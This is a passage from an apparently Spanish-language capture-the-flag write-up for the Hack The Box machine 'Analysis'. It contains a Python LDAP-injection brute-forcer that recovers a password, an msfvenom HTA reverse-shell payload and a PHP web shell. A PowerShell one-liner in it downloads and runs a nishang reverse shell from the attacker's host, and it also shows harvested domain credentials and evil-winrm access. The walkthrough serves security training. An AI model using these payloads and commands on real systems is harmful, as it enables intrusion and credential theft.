</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;users.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Usuario -&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> file:
</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>status(username)
</span></span><span style="display:flex;"><span>            brute(username)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    desc()
</span></span></code></pre></div><p>Vemos que el usuario <code>technician</code> es el único que tiene descripción.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 description.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>↓<span style="color:#f92672">]</span> Usuario -&gt;: technician
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> <span style="color:#f92672">]</span> Probando carácter -&gt;: ;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>.<span style="color:#ae81ff">\.</span>.....<span style="color:#f92672">]</span> Probando carácter -&gt;: ;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> Probando carácter -&gt;: ;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>◣<span style="color:#f92672">]</span> Probando carácter -&gt;: ;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>◑<span style="color:#f92672">]</span> Probando carácter -&gt;: ;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Probando carácter -&gt;: El usuario technician tiene descripción
</span></span></code></pre></div><p>Ahora este es el script para bruteforcear la descripción.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://internal.analysis.htb/users/list.php?name=&lt;USER&gt;)(description=&lt;DESC&gt;&#34;</span>
</span></span><span style="display:flex;"><span>DEFAULT_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">406</span>
</span></span><span style="display:flex;"><span>alphabet <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_@</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">-/!</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$%=^[]:;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute</span>(user, known_prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>    forged_url <span style="color:#f92672">=</span> URL<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;USER&gt;&#34;</span>, user)
</span></span><span style="display:flex;"><span>    description <span style="color:#f92672">=</span> known_prefix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Probando carácter -&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>status(description<span style="color:#f92672">+</span>char)
</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(forged_url<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;DESC&gt;&#34;</span>, description <span style="color:#f92672">+</span> char <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*&#34;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(r<span style="color:#f92672">.</span>text) <span style="color:#f92672">!=</span> DEFAULT_LEN:
</span></span><span style="display:flex;"><span>                description <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>                found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>  <span style="color:#75715e"># Salir del bucle interno</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found_char:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Descripción final descubierta: </span><span style="color:#e6db74">{</span>description<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>  <span style="color:#75715e"># Salir del bucle externo</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">desc</span>():
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Usuario -&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;technician&#34;</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>status(username)
</span></span><span style="display:flex;"><span>    brute(username)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    desc()
</span></span></code></pre></div><p>Si lo dejamos un rato..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 description.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>▃<span style="color:#f92672">]</span> Usuario -&gt;: technician
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Probando carácter -&gt;: Descripción final descubierta: 97NTtl
</span></span></code></pre></div><p>Pero esta credencial es inválida.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.179 -u technician -p 97NTtl
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC-ANALYSIS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:analysis.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> analysis.htb<span style="color:#ae81ff">\t</span>echnician:97NTtl STATUS_LOGON_FAILURE
</span></span></code></pre></div><p>He omitido los caracteres <code>(</code> <code>)</code> y <code>*</code> porque rompían la inyección, por lo cual supongo que la credencial contiene alguno de estos caracteres.</p>
<p><img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Añado el carácter <code>*</code>. El problema es que puede dar falsos positivos, si esto es así, bruteforcearé luego con <code>netexec</code> los posibles campos que falten.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 description.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>d<span style="color:#f92672">]</span> Usuario -&gt;: technician
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>↗<span style="color:#f92672">]</span> Probando carácter -&gt;: 97NTtl*4QP96Bv**aaaaaaaaaaa
</span></span></code></pre></div><p>La <code>a</code> surge ya que la consulta por LDAP se rompe al introducir doble <code>*</code>. Por lo cual podemos probar como credencial <code>97NTtl*4QP96Bv</code></p>
<p>¡Y es válida!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.179 -u technician -p <span style="color:#e6db74">&#39;97NTtl*4QP96Bv&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC-ANALYSIS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:analysis.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> analysis.htb<span style="color:#ae81ff">\t</span>echnician:97NTtl*4QP96Bv
</span></span></code></pre></div><p>Este usuario no está en el grupo de <code>Remote Management Users</code> por lo cual no podemos conseguir una consola interactiva utilizando herramientas como <code>evil-winrm</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc winrm 10.129.230.179 -u technician -p <span style="color:#e6db74">&#39;97NTtl*4QP96Bv&#39;</span>
</span></span><span style="display:flex;"><span>WINRM       10.129.230.179  <span style="color:#ae81ff">5985</span>   DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC-ANALYSIS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:analysis.htb<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.129.230.179  <span style="color:#ae81ff">5985</span>   DC-ANALYSIS      <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> analysis.htb<span style="color:#ae81ff">\t</span>echnician:97NTtl*4QP96Bv
</span></span></code></pre></div><p>Por SMB tampoco vemos ningún recurso compartido a nivel de red interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.179 -u technician -p <span style="color:#e6db74">&#39;97NTtl*4QP96Bv&#39;</span> --shares
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC-ANALYSIS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:analysis.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> analysis.htb<span style="color:#ae81ff">\t</span>echnician:97NTtl*4QP96Bv
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      ADMIN$                          Administration à distance
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      C$                              Partage par défaut
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      IPC$            READ            IPC distant
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      NETLOGON        READ            Partage de serveur d<span style="color:#e6db74">&#39;accès
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SMB         10.129.230.179  445    DC-ANALYSIS      SYSVOL          READ            Partage de serveur d&#39;</span>accès
</span></span></code></pre></div><p>Pero tenemos unas credenciales.</p>
<h2 id="enumerating-http-again">Enumerating HTTP (again)</h2>
<p>Al no ver nada interesante con estas credenciales, podemos seguir enumerando <code>internal.analysis.htb</code> ya que antes enumeré mas profundamente los recursos <code>/users</code> y <code>/dashboard</code> pero me falta <code>/employees</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ feroxbuster -u http://internal.analysis.htb/employees/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ae81ff">1</span> -t <span style="color:#ae81ff">100</span> -x php,asp,aspx
</span></span></code></pre></div><p>Y encontramos un recurso <code>login.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
</span></span></code></pre></div><p><img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>Pide el email para iniciar sesión
Probando <code>technician@analysis.htb:97NTtl*4QP96Bv</code> podemos iniciar sesión.
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Vemos una sección <code>Messages</code> donde algunos usuarios se están quejando de que el servidor va lento, puede ser por el fuzzeo que hemos realizado. Me gusta el realismo que han aplicado en esta máquina.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Vemos algunos To Dos, por lo que veo existe algún sistema de tickets detrás, y el recordatorio mas importante de aquí es que se están quejando de que no tienen café en las oficinas.
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Podemos ver tickets.
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>Los mas relevantes este que menciona problemas con un ticket TGT.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Y este en el cual un usuario se queja de que no puede ejecutar un archivo HTA, hay tenerlo en cuenta ya que podríamos fabricar un archivo HTA malicioso y que este usuario al ejecutarlo nos mande una consola interactiva.
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>Luego vemos que tenemos una subida de archivos que supuestamente, lo que subamos será analizado por el equipo de SOC. Si <code>Clara Williams</code> pertenece a este equipo, quizás ejecute un archivo HTA si lo subimos.
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p>También vemos un panel que se enviará a un usuario, podríamos probar XSS aquí.
<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<h1 id="foothold">Foothold</h1>
<p>Vamos a probar a subir un archivo .hta</p>
<p>Creamos el payload con <code>msfvenom</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.13 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f hta-psh &gt; shell.hta
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">324</span> bytes
</span></span><span style="display:flex;"><span>Final size of hta-psh file: <span style="color:#ae81ff">7407</span> bytes
</span></span></code></pre></div><p>Pero al enviar el archivo no recibimos la shell&hellip;</p>
<p>Alternativamente podemos crear un archivo <code>info.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">phpinfo</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Y al subirlo, podemos ver que el archivo existe en la ruta <code>/dashboard/uploads/info.php</code>
<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
<p>No existen <code>disable_functions</code>
<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>Creamos una web_shell&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Y conseguimos ejecución remota de comandos.
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
<p>Ahora para mandarnos la consola utilizamos el script <code>Invoke-PowerShellTcp.ps1</code> de <code>nishang</code>
Y a lo último del script añadimos esta línea.
<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
<p>Servimos este archivo con python por el puerto 8081.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span></code></pre></div><p>Ahora utilizamos este one-liner para descargar y ejecutar el script.
<code>http://internal.analysis.htb/dashboard/uploads/shell.php?cmd=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.13:8081/Invoke-PowerShellTcp.ps1%27)%20|%20powershell%20-noprofile%20-</code></p>
<p>Y&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>10.129.230.179 - - <span style="color:#f92672">[</span>12/Aug/2024 22:03:22<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.13<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.179<span style="color:#f92672">]</span> <span style="color:#ae81ff">62413</span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user DC-ANALYSIS$ on DC-ANALYSIS
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\i</span>nternal<span style="color:#ae81ff">\d</span>ashboard<span style="color:#ae81ff">\u</span>ploads&gt;whoami
</span></span><span style="display:flex;"><span>analysis<span style="color:#ae81ff">\s</span>vc_web
</span></span></code></pre></div><p>Podemos ver que el sistema está en francés, así que cuidado con el nombre de cuentas de usuario.
<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
<p>De hecho podemos comprobar el nombre de la cuenta del administrador.
<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
<h1 id="user-pivoting--jdoe">User Pivoting | jdoe</h1>
<p>Pasando el <code>winPEASx64.exe</code> encontramos unas credenciales en el autologon para el usuario <code>jdoe</code></p>
<p><img src="images/Screenshot_28.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb analysis.htb -u <span style="color:#e6db74">&#39;jdoe&#39;</span> -p <span style="color:#e6db74">&#39;7y4Z4^*y9Zzj&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC-ANALYSIS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:analysis.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.230.179  <span style="color:#ae81ff">445</span>    DC-ANALYSIS      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> analysis.htb<span style="color:#ae81ff">\j</span>doe:7y4Z4^*y9Zzj
</span></span></code></pre></div><p>Comprobamos que son válidas..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc winrm analysis.htb -u <span style="color:#e6db74">&#39;jdoe&#39;</span> -p <span style="color:#e6db74">&#39;7y4Z4^*y9Zzj&#39;</span>
</span></span><span style="display:flex;"><span>WINRM       10.129.230.179  <span style="color:#ae81ff">5985</span>   DC-ANALYSIS      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC-ANALYSIS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:analysis.htb<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.129.230.179  <span style="color:#ae81ff">5985</span>   DC-ANALYSIS      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> analysis.htb<span style="color:#ae81ff">\j</span>doe:7y4Z4^*y9Zzj <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y está en el grupo <code>Remote Management Users</code> por lo cual con <code>evil-winrm</code>..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ evil-winrm -i 10.129.230.179 -u jdoe -p <span style="color:#e6db74">&#39;7y4Z4^*y9Zzj&#39;</span>
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.5
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>doe<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
</span></span><span style="display:flex;"><span>analysis<span style="color:#ae81ff">\j</span>doe
</span></span></code></pre></div><p>Y podemos leer la flag de usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>doe<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
</span></span><span style="display:flex;"><span>6c60ab7f059622a5...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>En la raíz del sistema vemos dos archivos interesantes.
<img src="images/Screenshot_29.png" alt="Write-up Image"></p>
<p>Un log de Snort</p>
<p>y un mensaje encriptado</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\private&gt; type encoded.txt
</span></span><span style="display:flex;"><span>-----BEGIN ENCODED MESSAGE-----
</span></span><span style="display:flex;"><span>Version<span style="color:#960050;background-color:#1e0010">:</span> BCTextEncoder Utility v. <span style="color:#ae81ff">1.03</span>.2.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wy4ECQMCq0jPQTxt+3BgTzQTBPQFbt5KnV7LgBq6vcKWtbdKAf59hbw0KGN9lBIK
</span></span><span style="display:flex;"><span>0kcBSYXfHU2s7xsWA3pCtjthI0lge3SyLOMw9T81CPqT3HOIKkh3SVcO9jdrxfwu
</span></span><span style="display:flex;"><span>pHnjX+5HyybuBwIQwGprgyWdGnyv3mfcQQ==
</span></span><span style="display:flex;"><span>=a7bc
</span></span><span style="display:flex;"><span>-----END ENCODED MESSAGE-----
</span></span></code></pre></div><p>Analizando mas a fondo la configuración de snort <code>C:\Snort\etc\snort.conf</code> podemos ver esta línea.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat snort.conf | grep dynamicpreprocessor
</span></span><span style="display:flex;"><span>dynamicpreprocessor directory C:<span style="color:#ae81ff">\S</span>nort<span style="color:#ae81ff">\l</span>ib<span style="color:#ae81ff">\s</span>nort_dynamicpreprocessor
